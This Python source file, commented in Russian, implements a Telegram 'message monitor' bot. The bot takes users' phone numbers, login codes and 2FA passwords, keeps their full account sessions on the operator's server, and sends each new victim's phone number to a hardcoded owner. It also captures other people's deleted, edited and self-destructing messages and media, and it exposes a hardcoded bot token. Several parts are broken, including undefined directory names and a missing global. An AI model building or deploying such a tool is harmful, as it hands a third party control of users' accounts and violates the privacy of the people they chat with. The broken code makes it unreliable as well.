import os
import asyncio
import logging
import json
import sqlite3
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from telethon import TelegramClient, events
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage,
    MessageService, Photo, Document, DocumentAttributeVideo,
    DocumentAttributeFilename, PeerUser, PeerChat, PeerChannel,
    MessageEntityPre, Message
)
from telethon.tl.functions.messages import GetDialogFiltersRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import mimetypes

# ==================== НАСТРОЙКА ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# КОНФИГУРАЦИЯ
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH', '')
BOT_TOKEN = "5680618930:AAHnf4KcIf6_GA655Y_HqsMxGj3O71Fzz8g"
OWNER_USERNAME = "MaksimXyila"  # Ваш юзернейм БЕЗ @
OWNER_ID = 0  # Заполнится автоматически

# Папки для сохранения
MEDIA_DIR = Path("saved_media")
MEDIA_DIR.mkdir(exist_ok=True)
PHOTOS_DIR = MEDIA_DIR / "photos"
PHOTOS_DIR.mkdir(exist_ok=True)

# Инициализация клиентов
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)  # Управляющий бот

# База данных для статистики
DB_FILE = "users_stats.db"

def init_db():
    """Инициализация базы данных для статистики"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Таблица подключённых пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS connected_users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT NOT NULL,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            session_file TEXT,
            connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_activity TIMESTAMP,
            message_count INTEGER DEFAULT 0,
            deleted_count INTEGER DEFAULT 0,
            edited_count INTEGER DEFAULT 0,
            media_count INTEGER DEFAULT 0,
            is_active BOOLEAN DEFAULT 1
        )
    ''')
    
    # Таблица событий
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            event_type TEXT,  -- 'connected', 'disconnected', 'deleted', 'edited', 'media_saved'
            chat_id INTEGER,
            chat_title TEXT,
            message_id INTEGER,
            details TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES connected_users(user_id)
        )
    ''')
    
    # Таблица отслеживаемых чатов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracked_chats (
            chat_id INTEGER PRIMARY KEY,
            chat_title TEXT,
            chat_type TEXT,
            owner_id INTEGER,
            tracked_since TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            message_count INTEGER DEFAULT 0,
            deleted_count INTEGER DEFAULT 0,
            FOREIGN KEY (owner_id) REFERENCES connected_users(user_id)
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# Хранилища
user_clients = {}  # Активные юзер-клиенты: {user_id: client}
auth_sessions = {}  # Сессии авторизации
message_cache = {}  # Кэш сообщений
active_chats = {}  # Активные чаты: {user_id: [chat_ids]}
connected_users_info = {}  # Инфо о подключённых: {user_id: {info}}

# ==================== ФУНКЦИИ БАЗЫ ДАННЫХ ====================
def db_execute(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    conn.commit()
    conn.close()

def db_fetch(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(query, params)
    result = cursor.fetchall()
    conn.close()
    return result

async def register_user_connection(user_id, phone, user_info, session_file):
    """Регистрация нового подключения пользователя"""
    try:
        db_execute('''
            INSERT OR REPLACE INTO connected_users 
            (user_id, phone, username, first_name, last_name, session_file, connected_at, last_activity, is_active)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
        ''', (
            user_id,
            phone,
            user_info.get('username', ''),
            user_info.get('first_name', ''),
            user_info.get('last_name', ''),
            session_file,
            datetime.now(),
            datetime.now()
        ))
        
        # Логируем событие подключения
        db_execute('''
            INSERT INTO user_events (user_id, event_type, details)
            VALUES (?, ?, ?)
        ''', (user_id, 'connected', json.dumps(user_info)))
        
        logger.info(f"Зарегистрирован пользователь {user_id}: {phone}")
        return True
    except Exception as e:
        logger.error(f"Ошибка регистрации пользователя: {e}")
        return False

async def log_user_event(user_id, event_type, **details):
    """Логирование события пользователя"""
    try:
        db_execute('''
            INSERT INTO user_events (user_id, event_type, chat_id, chat_title, message_id, details)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            user_id,
            event_type,
            details.get('chat_id'),
            details.get('chat_title', '')[:100],
            details.get('message_id'),
            json.dumps(details) if details else ''
        ))
        
        # Обновляем счётчики
        if event_type == 'deleted':
            db_execute('UPDATE connected_users SET deleted_count = deleted_count + 1 WHERE user_id = ?', (user_id,))
        elif event_type == 'edited':
            db_execute('UPDATE connected_users SET edited_count = edited_count + 1 WHERE user_id = ?', (user_id,))
        elif event_type == 'media_saved':
            db_execute('UPDATE connected_users SET media_count = media_count + 1 WHERE user_id = ?', (user_id,))
        
        # Обновляем время последней активности
        db_execute('UPDATE connected_users SET last_activity = ? WHERE user_id = ?', (datetime.now(), user_id))
        
    except Exception as e:
        logger.error(f"Ошибка логирования события: {e}")

async def get_user_stats(user_id=None):
    """Получение статистики пользователя/всех пользователей"""
    try:
        if user_id:
            result = db_fetch('''
                SELECT 
                    user_id, phone, username, first_name, last_name,
                    connected_at, last_activity,
                    message_count, deleted_count, edited_count, media_count,
                    is_active,
                    (SELECT COUNT(*) FROM user_events WHERE user_id = ?) as total_events
                FROM connected_users 
                WHERE user_id = ?
            ''', (user_id, user_id))
            
            if result:
                row = result[0]
                return {
                    'user_id': row[0],
                    'phone': row[1],
                    'username': row[2],
                    'name': f"{row[3]} {row[4]}",
                    'connected_at': row[5],
                    'last_activity': row[6],
                    'messages': row[7],
                    'deleted': row[8],
                    'edited': row[9],
                    'media': row[10],
                    'active': bool(row[11]),
                    'total_events': row[12]
                }
            return None
        else:
            # Вся статистика
            result = db_fetch('''
                SELECT 
                    user_id, phone, username, first_name, last_name,
                    connected_at, last_activity,
                    message_count, deleted_count, edited_count, media_count,
                    is_active
                FROM connected_users 
                ORDER BY connected_at DESC
            ''')
            
            stats = {
                'total_users': len(result),
                'active_users': sum(1 for r in result if r[10]),
                'total_deleted': sum(r[8] for r in result),
                'total_edited': sum(r[9] for r in result),
                'total_media': sum(r[10] for r in result),
                'users': []
            }
            
            for row in result:
                last_active = datetime.strptime(row[6], '%Y-%m-%d %H:%M:%S') if isinstance(row[6], str) else row[6]
                days_inactive = (datetime.now() - last_active).days if last_active else 999
                
                stats['users'].append({
                    'user_id': row[0],
                    'phone': row[1],
                    'username': f"@{row[2]}" if row[2] else "нет",
                    'name': f"{row[3]} {row[4]}".strip(),
                    'connected': row[5],
                    'last_active': row[6],
                    'deleted': row[8],
                    'edited': row[9],
                    'media': row[10],
                    'active': bool(row[11]),
                    'inactive_days': days_inactive
                })
            
            return stats
            
    except Exception as e:
        logger.error(f"Ошибка получения статистики: {e}")
        return None

async def notify_owner_about_new_user(user_id, phone, user_info):
    """Уведомление владельца о новом подключении"""
    try:
        # Получаем объект владельца
        owner = await bot.get_entity(OWNER_USERNAME)
        global OWNER_ID
        OWNER_ID = owner.id
        
        # Формируем сообщение
        username = user_info.get('username', 'нет')
        first_name = user_info.get('first_name', '')
        last_name = user_info.get('last_name', '')
        name = f"{first_name} {last_name}".strip()
        
        message = f"""
🔔 **НОВОЕ ПОДКЛЮЧЕНИЕ!** #{user_id}

📱 **Телефон:** `{phone}`
👤 **Пользователь:** {name}
📎 **Юзернейм:** @{username if username else 'нет'}
🆔 **ID:** `{user_id}`
🕐 **Время:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}

📊 **Статистика подключений:**
Всего пользователей: {len(connected_users_info) + 1}
Активных: {sum(1 for uid in connected_users_info if connected_users_info[uid].get('active', False)) + 1}
        """
        
        await bot.send_message(
            OWNER_ID,
            message,
            parse_mode='md'
        )
        
        logger.info(f"Уведомление отправлено @{OWNER_USERNAME}")
        
    except Exception as e:
        logger.error(f"Не удалось уведомить владельца: {e}")

# ==================== КОМАНДЫ БОТА ====================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Команда /start"""
    user = await event.get_sender()
    await event.reply(
        f"👋 Привет, {user.first_name}!\n\n"
        "🤖 **Message Monitor Bot**\n\n"
        "📋 **Команды:**\n"
        "/login — Подключить свой аккаунт\n"
        "/chats — Мои чаты\n"
        "/trackall — Отслеживать все чаты\n"
        "/stats — Моя статистика\n"
        "/help — Помощь\n\n"
        "⚡ **Функции:**\n"
        "• Автосохранение удалённых сообщений\n"
        "• Сохранение исчезающих фото/видео\n"
        "• Отслеживание изменённых сообщений\n"
        "• Уведомления в реальном времени"
    )

@bot.on(events.NewMessage(pattern='/login'))
async def login_command(event):
    """Авторизация по номеру телефона"""
    user_id = event.sender_id
    chat_id = event.chat_id
    
    # Проверяем, не авторизован ли уже
    if user_id in user_clients:
        await event.reply("✅ Вы уже подключены!")
        return
    
    auth_sessions[user_id] = {
        'step': 'phone',
        'chat_id': chat_id,
        'data': {}
    }
    
    await event.reply(
        "📱 **АВТОРИЗАЦИЯ**\n\n"
        "Отправьте номер телефона в формате:\n"
        "`+79123456789`\n\n"
        "❌ /cancel — отмена",
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_command(event):
    """Отмена авторизации"""
    user_id = event.sender_id
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            await auth_sessions[user_id]['client'].disconnect()
        del auth_sessions[user_id]
        await event.reply("❌ Авторизация отменена.")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    """Статистика пользователя"""
    user_id = event.sender_id
    
    if user_id not in user_clients:
        await event.reply("⚠️ Сначала подключите аккаунт командой /login")
        return
    
    stats = await get_user_stats(user_id)
    if stats:
        message = f"""
📊 **ВАША СТАТИСТИКА**

👤 **Аккаунт:** {stats['name']}
📱 **Телефон:** `{stats['phone']}`
📎 **Юзернейм:** @{stats['username'] if stats['username'] else 'нет'}

📈 **Активность:**
🕐 Подключен: {stats['connected_at']}
🔄 Последняя активность: {stats['last_activity']}

📝 **Сохранено:**
🗑️ Удалённых сообщений: {stats['deleted']}
✏️ Изменённых сообщений: {stats['edited']}
📸 Медиафайлов: {stats['media']}
📊 Всего событий: {stats['total_events']}

✅ Статус: {'Активен' if stats['active'] else 'Неактивен'}
        """
        await event.reply(message, parse_mode='md')
    else:
        await event.reply("❌ Статистика не найдена.")

@bot.on(events.NewMessage(pattern='/adminstats'))
async def admin_stats_command(event):
    """Статистика для админа (только владелец)"""
    user = await event.get_sender()
    
    # Проверяем, что это владелец
    owner = await bot.get_entity(OWNER_USERNAME)
    if user.id != owner.id:
        await event.reply("⛔ Эта команда только для владельца.")
        return
    
    stats = await get_user_stats()
    if stats:
        # Общая статистика
        total_msg = f"""
🏆 **АДМИН СТАТИСТИКА**

👥 **Пользователи:**
Всего: {stats['total_users']}
Активных: {stats['active_users']}

📊 **Сохранено всего:**
🗑️ Удалённых: {stats['total_deleted']}
✏️ Изменённых: {stats['total_edited']}
📸 Медиафайлов: {stats['total_media']}
        """
        
        await event.reply(total_msg, parse_mode='md')
        
        # Детали по каждому пользователю
        details = "🔍 **Детали по пользователям:**\n\n"
        for i, user_info in enumerate(stats['users'][:15], 1):  # Первые 15 пользователей
            status = "🟢" if user_info['active'] else "🔴"
            days = user_info['inactive_days']
            inactive = f" ({days} дн.)" if days > 1 else ""
            
            details += f"{i}. {status} {user_info['name']} (@{user_info['username'].replace('@', '')})\n"
            details += f"   📱 {user_info['phone']} | 🗑️ {user_info['deleted']} | ✏️ {user_info['edited']}{inactive}\n\n"
        
        if stats['users']:
            await event.reply(details, parse_mode='md')
    else:
        await event.reply("❌ Нет данных.")

@bot.on(events.NewMessage(pattern='/trackall'))
async def track_all_command(event):
    """Включить отслеживание всех чатов"""
    user_id = event.sender_id
    
    if user_id not in user_clients:
        await event.reply("⚠️ Сначала подключите аккаунт командой /login")
        return
    
    client = user_clients[user_id]
    
    try:
        # Получаем все диалоги
        dialogs = await client.get_dialogs(limit=50)
        
        tracked = []
        for dialog in dialogs:
            chat = dialog.entity
            chat_id = chat.id
            
            if chat_id not in active_chats.get(user_id, []):
                if user_id not in active_chats:
                    active_chats[user_id] = []
                active_chats[user_id].append(chat_id)
                tracked.append(chat_id)
                
                # Добавляем в базу
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                chat_type = type(chat).__name__
                
                db_execute('''
                    INSERT OR REPLACE INTO tracked_chats (chat_id, chat_title, chat_type, owner_id)
                    VALUES (?, ?, ?, ?)
                ''', (chat_id, chat_title, chat_type, user_id))
        
        await event.reply(f"✅ Начато отслеживание {len(tracked)} чатов!")
        
    except Exception as e:
        logger.error(f"Ошибка trackall: {e}")
        await event.reply(f"❌ Ошибка: {str(e)[:100]}")

@bot.on(events.NewMessage(pattern='/chats'))
async def chats_command(event):
    """Список отслеживаемых чатов"""
    user_id = event.sender_id
    
    if user_id not in user_clients or user_id not in active_chats:
        await event.reply("📭 Нет отслеживаемых чатов.")
        return
    
    client = user_clients[user_id]
    message = "📋 **ОТСЛЕЖИВАЕМЫЕ ЧАТЫ:**\n\n"
    
    for i, chat_id in enumerate(active_chats[user_id][:20], 1):
        try:
            chat = await client.get_entity(chat_id)
            chat_title = getattr(chat, 'title', f"Chat {chat_id}")
            message += f"{i}. {chat_title} (ID: `{chat_id}`)\n"
        except:
            message += f"{i}. Чат ID: `{chat_id}`\n"
    
    if len(active_chats[user_id]) > 20:
        message += f"\n... и ещё {len(active_chats[user_id]) - 20} чатов"
    
    await event.reply(message, parse_mode='md')

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    """Справка"""
    await event.reply(
        "ℹ️ **СПРАВКА**\n\n"
        "📱 **Авторизация:**\n"
        "1. /login — начать авторизацию\n"
        "2. Отправьте номер телефона\n"
        "3. Отправьте код из Telegram\n"
        "4. При необходимости — пароль 2FA\n\n"
        "👁️ **Отслеживание:**\n"
        "/trackall — отслеживать все чаты\n"
        "/chats — список чатов\n\n"
        "📊 **Статистика:**\n"
        "/stats — ваша статистика\n\n"
        "⚙️ **Другие команды:**\n"
        "/cancel — отмена авторизации\n"
        "/help — эта справка\n\n"
        "🔔 **Что отслеживается:**\n"
        "• Все удалённые сообщения\n"
        "• Все изменённые сообщения\n"
        "• Исчезающие фото/видео\n"
        "• Автоуведомления в реальном времени"
    )

# ==================== АВТОРИЗАЦИЯ ====================
@bot.on(events.NewMessage)
async def auth_handler(event):
    """Обработка авторизации"""
    user_id = event.sender_id
    if user_id not in auth_sessions:
        return
    
    session = auth_sessions[user_id]
    text = event.text.strip()
    
    # Шаг 1: Получение номера телефона
    if session['step'] == 'phone':
        if text == '/cancel':
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        if not text.startswith('+') or not text[1:].isdigit() or len(text) < 10:
            await event.reply("❌ Неверный формат номера. Пример: `+79123456789`\n/cancel — отмена")
            return
        
        try:
            # Создаём временный клиент
            temp_client = TelegramClient(
                f'session_{user_id}',
                API_ID,
                API_HASH,
                device_model="MessageMonitor",
                system_version="1.0"
            )
            await temp_client.connect()
            
            # Отправляем код
            sent_code = await temp_client.send_code_request(text)
            
            session['step'] = 'code'
            session['phone'] = text
            session['phone_code_hash'] = sent_code.phone_code_hash
            session['client'] = temp_client
            
            await event.reply(
                f"📲 Код отправлен на {text}\n\n"
                "Введите 5-значный код из Telegram:\n"
                "Пример: `12345`\n\n"
                "❌ /cancel — отмена",
                parse_mode='md'
            )
            
        except Exception as e:
            logger.error(f"Ошибка отправки кода: {e}")
            await event.reply(f"❌ Ошибка: {str(e)[:100]}")
            if 'client' in session:
                await session['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 2: Получение кода
    elif session['step'] == 'code':
        if text == '/cancel':
            await session['client'].disconnect()
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        if not text.isdigit() or len(text) != 5:
            await event.reply("❌ Код должен быть 5 цифр. Пример: `12345`\n/cancel — отмена")
            return
        
        try:
            # Пытаемся войти
            await session['client'].sign_in(
                phone=session['phone'],
                code=text,
                phone_code_hash=session['phone_code_hash']
            )
            
            # УСПЕШНАЯ АВТОРИЗАЦИЯ!
            await complete_authorization(user_id, session)
            
        except SessionPasswordNeededError:
            session['step'] = 'password'
            await event.reply(
                "🔐 Требуется двухэтапная аутентификация.\n"
                "Введите пароль:\n\n"
                "❌ /cancel — отмена"
            )
        except PhoneCodeInvalidError:
            await event.reply("❌ Неверный код. Попробуйте снова или /cancel")
        except Exception as e:
            logger.error(f"Ошибка входа: {e}")
            await event.reply(f"❌ Ошибка авторизации: {str(e)[:100]}")
            await session['client'].disconnect()
            del auth_sessions[user_id]
    
    # Шаг 3: Пароль 2FA
    elif session['step'] == 'password':
        if text == '/cancel':
            await session['client'].disconnect()
            del auth_sessions[user_id]
            await event.reply("❌ Авторизация отменена.")
            return
        
        try:
            await session['client'].sign_in(password=text)
            # УСПЕШНАЯ АВТОРИЗАЦИЯ С 2FA!
            await complete_authorization(user_id, session)
            
        except Exception as e:
            logger.error(f"Ошибка 2FA: {e}")
            await event.reply(f"❌ Неверный пароль: {str(e)[:100]}")
            await session['client'].disconnect()
            del auth_sessions[user_id]

async def complete_authorization(user_id, session):
    """Завершение авторизации"""
    try:
        client = session['client']
        phone = session['phone']
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        user_info = {
            'user_id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name or '',
            'username': me.username or '',
            'phone': phone
        }
        
        # Сохраняем сессию
        client.session.save()
        
        # Регистрируем пользователя в базе
        session_file = f"session_{user_id}.session"
        await register_user_connection(user_id, phone, user_info, session_file)
        
        # Сохраняем клиент
        user_clients[user_id] = client
        connected_users_info[user_id] = {
            **user_info,
            'connected_at': datetime.now(),
            'active': True
        }
        
        # Уведомляем владельца
        await notify_owner_about_new_user(user_id, phone, user_info)
        
        # Запускаем обработчики для этого клиента
        asyncio.create_task(setup_user_client_handlers(client, user_id))
        
        # Уведомляем пользователя
        await bot.send_message(
            session['chat_id'],
            f"✅ **АВТОРИЗАЦИЯ УСПЕШНАЯ!**\n\n"
            f"👋 Добро пожаловать, {user_info['first_name']}!\n\n"
            "🤖 **Бот теперь отслеживает:**\n"
            "• Все удалённые сообщения\n"
            "• Все изменённые сообщения\n"
            "• Исчезающие фото/видео\n\n"
            "📋 **Команды:**\n"
            "/trackall — отслеживать все чаты\n"
            "/chats — список чатов\n"
            "/stats — ваша статистика\n\n"
            "🔔 Уведомления будут приходить в этот чат!",
            parse_mode='md'
        )
        
        # Очищаем сессию авторизации
        del auth_sessions[user_id]
        
        logger.info(f"Пользователь {user_id} успешно авторизован")
        
    except Exception as e:
        logger.error(f"Ошибка завершения авторизации: {e}")
        await bot.send_message(
            session['chat_id'],
            f"❌ Ошибка завершения авторизации: {str(e)[:100]}"
        )

# ==================== ОБРАБОТЧИКИ ЮЗЕР-КЛИЕНТОВ ====================
async def setup_user_client_handlers(client, owner_id):
    """Настройка обработчиков для юзер-клиента"""
    
    @client.on(events.MessageDeleted)
    async def handle_deleted(event):
        """Обработка удалённых сообщений"""
        try:
            for chat_id, deleted_ids in event.deleted_ids.items():
                if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                    continue
                
                chat = await client.get_entity(chat_id)
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                
                for msg_id in deleted_ids:
                    cache_key = f"{chat_id}_{msg_id}"
                    if cache_key in message_cache:
                        cached_msg = message_cache[cache_key]
                        
                        # Формируем сообщение
                        sender = await cached_msg.get_sender()
                        sender_name = getattr(sender, 'first_name', 'Unknown')
                        text = cached_msg.message or ""
                        
                        msg_text = f"""
🗑️ **УДАЛЁННОЕ СООБЩЕНИЕ**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🆔 **ID:** {msg_id}
📅 **Время:** {cached_msg.date.strftime('%H:%M:%S') if hasattr(cached_msg, 'date') else 'Unknown'}

📝 **Текст:**
{text[:500]}
                        """
                        
                        # Отправляем владельцу юзер-бота
                        await bot.send_message(
                            owner_id,
                            msg_text.strip(),
                            parse_mode='md'
                        )
                        
                        # Логируем событие
                        await log_user_event(
                            owner_id,
                            'deleted',
                            chat_id=chat_id,
                            chat_title=chat_title,
                            message_id=msg_id,
                            sender_id=sender.id if sender else 0,
                            content_preview=text[:200]
                        )
                        
                        # Удаляем из кэша
                        del message_cache[cache_key]
                        
        except Exception as e:
            logger.error(f"Ошибка обработки удаления: {e}")
    
    @client.on(events.MessageEdited)
    async def handle_edited(event):
        """Обработка изменённых сообщений"""
        try:
            message = event.message
            chat = await message.get_chat()
            chat_id = chat.id
            
            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                return
            
            # Получаем старое сообщение из кэша
            cache_key = f"{chat_id}_{message.id}"
            old_text = ""
            if cache_key in message_cache:
                old_msg = message_cache[cache_key]
                old_text = old_msg.message or ""
            
            # Обновляем кэш
            message_cache[cache_key] = message
            
            # Если есть изменения текста
            new_text = message.message or ""
            if old_text and old_text != new_text:
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                sender = await message.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                
                msg_text = f"""
✏️ **ИЗМЕНЁННОЕ СООБЩЕНИЕ**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🆔 **ID:** {message.id}

📝 **Было:**
{old_text[:300]}

📝 **Стало:**
{new_text[:300]}
                """
                
                await bot.send_message(
                    owner_id,
                    msg_text.strip(),
                    parse_mode='md'
                )
                
                await log_user_event(
                    owner_id,
                    'edited',
                    chat_id=chat_id,
                    chat_title=chat_title,
                    message_id=message.id,
                    sender_id=sender.id if sender else 0,
                    old_text_preview=old_text[:200],
                    new_text_preview=new_text[:200]
                )
                
        except Exception as e:
            logger.error(f"Ошибка обработки редактирования: {e}")
    
    @client.on(events.NewMessage)
    async def handle_new_message(event):
        """Кэширование новых сообщений для отслеживания"""
        try:
            message = event.message
            chat = await message.get_chat()
            chat_id = chat.id
            
            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                return
            
            # Кэшируем сообщение
            cache_key = f"{chat_id}_{message.id}"
            message_cache[cache_key] = message
            
            # Проверяем на исчезающие медиа (self-destruct)
            if message.media and hasattr(message, 'ttl_seconds') and message.ttl_seconds:
                # Это исчезающее сообщение - сохраняем медиа
                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
                media_info = await save_media(message, chat_title)
                
                if media_info:
                    file_path, media_type = media_info
                    
                    sender = await message.get_sender()
                    sender_name = getattr(sender, 'first_name', 'Unknown')
                    
                    msg_text = f"""
⚠️ **ИСЧЕЗАЮЩЕЕ {media_type.upper()} СОХРАНЕНО!**

💬 **Чат:** {chat_title}
👤 **От:** {sender_name}
🕐 **Исчезнет через:** {message.ttl_seconds} сек.
💾 **Сохранено в:** {file_path}
                    """
                    
                    await bot.send_message(
                        owner_id,
                        msg_text.strip(),
                        parse_mode='md'
                    )
                    
                    # Отправляем само медиа
                    try:
                        await bot.send_file(
                            owner_id,
                            file_path,
                            caption=f"📸 Исчезающее {media_type} из {chat_title}"
                        )
                    except:
                        pass
                    
                    await log_user_event(
                        owner_id,
                        'media_saved',
                        chat_id=chat_id,
                        chat_title=chat_title,
                        message_id=message.id,
                        media_type=media_type,
                        file_path=file_path,
                        ttl_seconds=message.ttl_seconds
                    )
            
        except Exception as e:
            logger.error(f"Ошибка обработки нового сообщения: {e}")

async def save_media(message, chat_title):
    """Сохранение медиа из сообщения"""
    try:
        if not message.media:
            return None
        
        # Создаём уникальное имя файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        chat_safe = "".join(c if c.isalnum() else "_" for c in chat_title)[:20]
        
        # Скачиваем медиа
        file_path = await message.download_media(file=MEDIA_DIR)
        if not file_path:
            return None
        
        # Определяем тип медиа
        if isinstance(message.media, MessageMediaPhoto):
            media_type = "photo"
            target_dir = PHOTOS_DIR
            ext = ".jpg"
        elif isinstance(message.media, MessageMediaDocument):
            doc = message.media.document
            if isinstance(doc, Document):
                for attr in doc.attributes:
                    if isinstance(attr, DocumentAttributeVideo):
                        media_type = "video"
                        target_dir = VIDEOS_DIR
                        ext = ".mp4"
                        break
                else:
                    media_type = "document"
                    target_dir = DOCS_DIR
                    ext = ""
            else:
                media_type = "document"
                target_dir = DOCS_DIR
                ext = ""
        else:
            return None
        
        # Перемещаем файл
        original_path = Path(file_path)
        if not ext:
            ext = original_path.suffix
        
        new_name = f"{chat_safe}_{timestamp}_{media_type}{ext}"
        new_path = target_dir / new_name
        
        original_path.rename(new_path)
        
        return str(new_path), media_type
        
    except Exception as e:
        logger.error(f"Ошибка сохранения медиа: {e}")
        return None

# ==================== ЗАПУСК ====================
async def main():
    """Основная функция запуска"""
    logger.info("🚀 Запуск Message Monitor Bot...")
    
    # Запускаем бота
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"🤖 Бот запущен: @{me.username}")
    
    # Автозагрузка существующих сессий
    session_files = [f for f in os.listdir('.') if f.startswith('session_') and f.endswith('.session')]
    for session_file in session_files:
        try:
            # Извлекаем user_id из имени файла
            user_id_str = session_file.replace('session_', '').replace('.session', '')
            if user_id_str.isdigit():
                user_id = int(user_id_str)
                
                # Подключаем клиент
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.connect()
                
                if await client.is_user_authorized():
                    # Получаем информацию о пользователе
                    me_user = await client.get_me()
                    
                    # Регистрируем в системе
                    user_clients[user_id] = client
                    connected_users_info[user_id] = {
                        'user_id': me_user.id,
                        'first_name': me_user.first_name,
                        'last_name': me_user.last_name or '',
                        'username': me_user.username or '',
                        'phone': 'loaded_from_session',
                        'active': True
                    }
                    
                    # Запускаем обработчики
                    asyncio.create_task(setup_user_client_handlers(client, user_id))
                    
                    logger.info(f"📂 Загружена сессия для user_id={user_id}")
                    
                    # Добавляем все чаты в отслеживание
                    try:
                        dialogs = await client.get_dialogs(limit=30)
                        if user_id not in active_chats:
                            active_chats[user_id] = []
                        
                        for dialog in dialogs:
                            chat = dialog.entity
                            chat_id = chat.id
                            if chat_id not in active_chats[user_id]:
                                active_chats[user_id].append(chat_id)
                    except:
                        pass
                    
                else:
                    await client.disconnect()
                    os.remove(session_file)
                    
        except Exception as e:
            logger.error(f"Ошибка загрузки сессии {session_file}: {e}")
    
    # Уведомление владельцу о запуске
    try:
        owner = await bot.get_entity(OWNER_USERNAME)
        OWNER_ID = owner.id
        
        # Получаем статистику
        stats = await get_user_stats()
        active_count = sum(1 for uid in connected_users_info if connected_users_info[uid].get('active', False))
        
        await bot.send_message(
            OWNER_ID,
            f"🤖 **MESSAGE MONITOR BOT ЗАПУЩЕН**\n\n"
            f"• Бот: @{me.username}\n"
            f"• Время: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
            f"• Загружено сессий: {len(user_clients)}\n"
            f"• Активных пользователей: {active_count}\n"
            f"• Всего пользователей в БД: {stats['total_users'] if stats else 0}\n\n"
            f"✅ **Система готова к работе!**",
            parse_mode='md'
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить владельца: {e}")
    
    logger.info(f"✅ Система запущена. Активных пользователей: {len(user_clients)}")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
